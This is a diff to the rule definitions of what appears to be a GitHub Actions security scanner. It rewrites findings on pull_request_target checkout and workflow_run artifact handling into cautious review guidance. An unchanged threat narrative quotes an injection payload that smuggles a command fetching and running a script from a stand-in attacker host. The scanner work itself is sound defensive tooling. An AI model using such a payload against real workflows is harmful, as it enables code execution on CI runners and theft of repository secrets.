@@ -1849,16 +1849,27 @@ RULES: list[Rule] = [
         severity=Severity.CRITICAL,
         platform=Platform.GITHUB,
         owasp_cicd="CICD-SEC-4",
+        review_needed=True,
         description=(
-            "Workflow uses pull_request_target AND checks out the PR author's code. "
-            "Attacker-controlled code executes with access to repo secrets and write permissions. "
-            "The PR's head.sha/head.ref values are critical when bound to the exact with.ref "
-            "input of an actions/checkout step. Simple workflow/job/step env aliases are resolved."
+            "A structurally parsed ``actions/checkout`` step has a ``with.ref`` value bound "
+            "to ``github.event.pull_request.head.sha`` or ``.head.ref`` in a "
+            "``pull_request_target`` workflow. This identifies a configured PR-source "
+            "checkout candidate, not proof of execution or impact. Review the owning "
+            "event/job/step guard, exact action ref and ``allow-unsafe-pr-checkout`` setting, "
+            "subsequent commands and local files, ``permissions``, ``persist-credentials``, "
+            "and which explicit secrets are referenced and available to that same consumer."
         ),
         pattern=_PrivilegedPRCheckoutPattern(),
         remediation=(
-            "Use 'pull_request' trigger instead. If secrets are required, use a two-workflow "
-            "pattern: pull_request for build/test, workflow_run for privileged operations."
+            "Review the intended behavior before retaining PR-head checkout. Prefer "
+            "``pull_request`` when base-repository access is unnecessary. For a retained "
+            "``pull_request_target`` flow, confirm the exact checkout action ref and "
+            "``allow-unsafe-pr-checkout`` contract; inspect the command and local files used "
+            "after checkout to determine whether PR-controlled source runs or remains data. "
+            "Check guards at the owning job/step, ``permissions``, ``persist-credentials``, "
+            "and explicit secret references and availability for that consumer. A secret "
+            "declared for a sibling job is not evidence it is available here; separate "
+            "sensitive credentials from any job that executes untrusted source."
         ),
         reference="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/",
         test_positive=[
@@ -1870,11 +1881,13 @@ RULES: list[Rule] = [
         ],
         stride=["E", "I"],
         threat_narrative=(
-            "pull_request_target runs with the base repository's write permissions and full secret "
-            "access, and checking out the PR author's code gives an external contributor arbitrary "
-            "code execution in that privileged context. "
-            "This is the exact pattern exploited in the March 2026 Trivy supply chain attack to "
-            "exfiltrate repository secrets at scale from thousands of repositories."
+            "When a later command executes a PR-controlled file selected by checkout, the "
+            "code may run in the owning ``pull_request_target`` job. That consequence depends "
+            "on the executed source, event/job/step guards, action contract, effective token "
+            "permissions, credential persistence, and secrets actually referenced and "
+            "available to the consumer. A checkout declaration alone does not establish "
+            "execution, secret release, repository-write authority, or exfiltration; assess "
+            "those configured paths before treating this candidate as impact."
         ),
         incidents=["Trivy supply chain (Mar 2026)", "Ultralytics (Dec 2024)"],
         confidence="high",
@@ -1895,10 +1908,15 @@ RULES: list[Rule] = [
         platform=Platform.GITHUB,
         owasp_cicd="CICD-SEC-4",
         description=(
-            "Workflow uses pull_request_target which runs with write access to the base repo "
-            "and access to secrets. Even without PR checkout, this trigger is inherently risky. "
-            "Any future modification could introduce a PPE vulnerability. "
-            "If the workflow also checks out PR code, SEC4-GH-001 escalates to CRITICAL."
+            "The workflow declares ``pull_request_target``, which runs the workflow from the "
+            "base repository context and is intended for trusted automation responding to "
+            "pull requests. The event can provide an elevated ``GITHUB_TOKEN`` and "
+            "repository/organization secret availability, but the effective token scopes are "
+            "set by workflow/job permissions and a declaration does not show which secrets a "
+            "consumer references. This trigger-level finding does not show that PR-controlled "
+            "content is checked out or executed, or that any secret is released. Review "
+            "intended behavior, owning event/job/step guards, commands, permission settings, "
+            "and explicit credential references at their consuming steps."
         ),
         pattern=StructuralPattern(
             # Read the parsed config structurally instead of regex-matching
@@ -1920,7 +1938,13 @@ RULES: list[Rule] = [
             predicate=_is_pull_request_target_trigger,
             include_keys=True,
         ),
-        remediation="Use 'pull_request' trigger if write access is not required.",
+        remediation="Use ``pull_request`` where base-repository context and elevated permissions are "
+        "not needed. If ``pull_request_target`` is required for trusted automation, keep "
+        "PR-controlled values as data, explicitly limit token permissions, and inspect "
+        "each owning job/step for a PR-head checkout, fetch, artifact, command, or secret "
+        "reference. Confirm the actual credential bindings and guards there; do not "
+        "assume the event declaration proves that PR source is executed or a secret is "
+        "consumed.",
         reference="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/",
         test_positive=[
             "on:\n  pull_request_target:\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi",
@@ -1939,10 +1963,12 @@ RULES: list[Rule] = [
         ],
         stride=["E"],
         threat_narrative=(
-            "pull_request_target grants write repository access and exposes secrets to all workflow "
-            "steps, unlike pull_request which runs in a read-only context. "
-            "Even without explicit PR code checkout today, any future careless modification of this "
-            "workflow — such as adding actions/checkout — becomes a critical PPE vulnerability."
+            "This trigger runs the base-repository workflow and can be used for authenticated "
+            "pull-request automation. It becomes a code-execution concern only if a path "
+            "brings PR-controlled source to a command or tool that executes it; concrete "
+            "impact also depends on that consumer's effective permissions, referenced "
+            "secrets, and event/job/step guards. A trigger declaration alone does not "
+            "establish those conditions or secret release."
         ),
         incidents=["Trivy supply chain (Mar 2026)"],
         confidence="high",
@@ -1953,9 +1979,13 @@ RULES: list[Rule] = [
         severity=Severity.MEDIUM,
         platform=Platform.GITHUB,
         owasp_cicd="CICD-SEC-4",
+        review_needed=True,
         description=(
-            "Workflow triggers on workflow_run but doesn't verify the triggering workflow "
-            "succeeded. May process tainted artifacts from failed/compromised workflows."
+            "The file declares ``workflow_run`` but contains no recognized "
+            "``github.event.workflow_run.conclusion`` reference. This file-level absence does "
+            "not establish whether the owning job/step has an effective success guard or "
+            "whether a downloaded artifact's producer and contents are validated. Review the "
+            "consumer and any transfer path."
         ),
         pattern=ContextPattern(
             # The anchor matches the ``workflow_run`` trigger
@@ -1993,26 +2023,18 @@ RULES: list[Rule] = [
             exclude=[r"^\s*#"],
         ),
         remediation=(
-            "Gate the triggered job on the upstream conclusion AND treat every artefact "
-            "from the triggering workflow as untrusted — a successful `workflow_run` can "
-            "still receive head_sha / artefacts produced by fork code:\n"
-            "\n"
-            "jobs:\n"
-            "  deploy:\n"
-            "    if: github.event.workflow_run.conclusion == 'success'\n"
-            "    steps:\n"
-            "      # Check out the BASE repo SHA, not github.event.workflow_run.head_sha\n"
-            "      - uses: actions/checkout@<pinned-sha>\n"
-            "        with:\n"
-            "          ref: ${{ github.event.workflow_run.head_repository.default_branch }}\n"
-            "      # Download artefacts into a scratch dir and validate before use\n"
-            "      - uses: actions/download-artifact@<pinned-sha>\n"
-            "        with:\n"
-            "          path: ./untrusted/\n"
-            "      - run: ./scripts/validate-artifacts.sh ./untrusted/\n"
-            "\n"
-            "See the GitHub Security Lab write-up on preventing `workflow_run` pwn "
-            "requests for the full threat model."
+            "If the consumer should run only after a successful producer, gate its owning job "
+            "or step on ``github.event.workflow_run.conclusion == 'success'``. Success is not "
+            "artifact provenance. For ``actions/download-artifact``, select the intended "
+            "artifact with ``name: <expected-artifact-name>`` and ``run-id: ${{ "
+            "github.event.workflow_run.id }}``; specify the intended ``repository: ${{ "
+            "github.repository }}``. For a different run in this repository, supply "
+            "``github-token: ${{ secrets.GITHUB_TOKEN }}`` with ``actions: read``. "
+            "For another repository, use a credential authorized to read artifacts there; "
+            "the workflow GITHUB_TOKEN is limited to its own repository. "
+            "Verify the expected producer workflow/event/ref and validate content and "
+            "provenance before use. The default artifact name, repository, and token binding "
+            "need confirmation for this consumer."
         ),
         reference="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/",
         test_positive=[
@@ -2024,10 +2046,13 @@ RULES: list[Rule] = [
         ],
         stride=["T"],
         threat_narrative=(
-            "Processing artifacts from a failed or inconclusive upstream workflow may consume "
-            "build outputs produced under compromised or partial conditions. "
-            "An attacker who can trigger the upstream workflow to fail after partially completing "
-            "can produce tainted artifacts that the privileged downstream workflow then ships."
+            "A workflow_run declaration without a recognized conclusion reference is a "
+            "file-level missing-text observation, not proof that the consuming job lacks an "
+            "effective success guard. Even when a consumer gates on ``conclusion == "
+            "'success'``, that status does not establish which producer artifact was selected "
+            "or whether its content is trustworthy. Review the owning job/step, exact run ID, "
+            "repository, artifact name, token scope, and validation path; exposure depends on "
+            "what the consumer actually downloads and does."
         ),
         confidence="high",
     ),
@@ -2083,8 +2108,10 @@ RULES: list[Rule] = [
             "An attacker can craft a PR title, issue body, or branch name containing shell "
             "metacharacters — such as `'; curl attacker.com/c2.sh | bash #` — that execute as "
             "commands when the value is interpolated into a run: block. "
-            "The injected commands run with the workflow's full permissions including write access "
-            "and all bound secrets."
+            "If the owning event and job/step conditions permit execution, injected commands "
+            "may run with the authority available to that consumer. Requested token scopes, "
+            "credential bindings and provider settings need separate verification; this source "
+            "pattern alone establishes neither repository-write authority nor secret availability."
         ),
         incidents=["Ultralytics (Dec 2024)", "Langflow (2024)"],
         confidence="high",
